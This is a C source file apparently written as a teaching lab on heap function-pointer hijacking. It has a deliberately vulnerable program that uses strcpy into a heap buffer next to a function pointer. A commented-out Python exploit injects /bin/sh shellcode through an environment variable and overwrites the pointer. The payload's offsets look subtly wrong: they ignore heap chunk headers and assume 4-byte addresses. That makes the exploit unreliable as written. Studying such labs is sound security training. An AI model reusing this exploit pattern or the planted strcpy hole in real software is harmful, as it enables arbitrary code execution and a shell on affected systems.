/*
Function pointer overwrites via heap buffer overflows
------------------------------------------------------

If a program dynamically allocates two memory chunks using malloc(),
and one contains a buffer that can be overflown (e.g. via strcpy),
an attacker might overwrite a nearby **function pointer**.

This allows control over the execution flow — the overwritten pointer
can be made to jump to attacker-controlled shellcode.

CONCEPT: (Heap Function Pointer Hijack)
    - Allocate a buffer (heap chunk A) and a function pointer (chunk B)
    - Overflow buffer A to reach and overwrite the function pointer in chunk B
    - Call the function pointer → it jumps to shellcode

STEPS:
    1. Put shellcode in memory, typically via an environment variable
    2. Overflow a heap buffer to overwrite the function pointer with the shellcode address
    3. Trigger the function pointer → get code execution
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void not_called() {
    printf("This function should never be called.\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload>\n", argv[0]);
        return 1;
    }

    // Chunk A: vulnerable buffer
    char *a = malloc(64);

    // Chunk B: function pointer stored on the heap
    void (**func_ptr)() = malloc(sizeof(void (*)()));

    // Safe default: point to a harmless function
    *func_ptr = not_called;

    // For debugging: print where SC is in memory (set via environment)
    printf("Shellcode (SC) is at: %p\n", getenv("SC"));

    // Vulnerable strcpy — overflows 'a' and can reach func_ptr
    strcpy(a, argv[1]);

    // Try to call the function pointer (may be hijacked!)
    printf("Calling function pointer...\n");
    (*func_ptr)();

    return 0;
}


/*
Heap Buffer Overflow — Overwrite Function Pointer

This script performs a heap-based buffer overflow attack
on a C program that uses a function pointer stored on the heap.

STEPS:
    1. Place shellcode in memory using an environment variable
    2. Overflow a heap-allocated buffer to overwrite a function pointer
    3. Trigger the function call — it jumps to the shellcode

Full Python Exploit Example:
    • Puts shellcode in an env variable
    • Overwrites a function pointer with the shellcode address
    • Triggers the function pointer to execute the payload

// START OF PYTHON SCRIPT:
import os
import subprocess

# --- STEP 1: Shellcode to spawn /bin/sh ---
shellcode = (
    b"\x31\xc0"             # xor    eax,eax
    b"\x50"                 # push   eax
    b"\x68//sh"             # push   "//sh"
    b"\x68/bin"             # push   "/bin"
    b"\x89\xe3"             # mov    ebx,esp
    b"\x50"                 # push   eax
    b"\x53"                 # push   ebx
    b"\x89\xe1"             # mov    ecx,esp
    b"\x99"                 # cdq
    b"\xb0\x0b"             # mov    al,0xb
    b"\xcd\x80"             # int    0x80
)

# NOP sled + shellcode
env_payload = b"\x90" * 100 + shellcode
os.environ["SC"] = env_payload.decode("latin1")

# --- STEP 2: Get shellcode address ---
# Run the program once to print the env variable address
run = subprocess.run(["./heap_ptr_bof", "TEST"], env=os.environ, capture_output=True)
for line in run.stdout.decode().splitlines():
    if "Shellcode" in line:
        sc_addr = int(line.split(":")[1].strip(), 16)
        print(f"[+] Shellcode address: {hex(sc_addr)}")
        break
else:
    print("[-] Couldn't find shellcode address")
    exit(1)

# --- STEP 3: Build payload ---
# 64 bytes to fill buffer 'a' + 4 bytes to overwrite func_ptr
padding = b"A" * 64
overwrite = sc_addr.to_bytes(4, "little")  # Overwrite func_ptr with address of shellcode
payload = padding + overwrite

# --- STEP 4: Launch exploit ---
print("[*] Launching heap function pointer overwrite exploit...")
os.execve("./heap_ptr_bof", ["./heap_ptr_bof", payload.decode("latin1")], os.environ)

// end of script
*/